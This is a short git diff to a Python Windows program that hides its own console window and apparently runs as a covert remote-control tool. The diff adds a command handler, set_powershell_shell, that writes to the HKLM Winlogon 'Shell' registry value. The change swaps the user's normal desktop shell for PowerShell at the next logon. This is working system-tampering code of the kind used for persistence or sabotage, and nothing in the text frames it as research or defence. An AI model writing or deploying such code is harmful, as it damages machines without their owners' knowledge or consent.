@@ -1,6 +1,7 @@
 import shutil
 import subprocess
 import time
+import winreg
 import win32console
 import win32gui
 import psutil
@@ -119,3 +120,14 @@ def hide():
         window = win32console.GetConsoleWindow()
         win32gui.ShowWindow(window, 0)
     except: pass
+
+def set_powershell_shell(_):
+    try:
+        key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+        value_name = "Shell"
+        powershell_path = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, powershell_path)
+        winreg.CloseKey(key)
+        return "Shell changed to PowerShell. Restart the computer for changes to take effect."
+    except Exception as e: return f"Error in set_powershell_shell(): {e}"
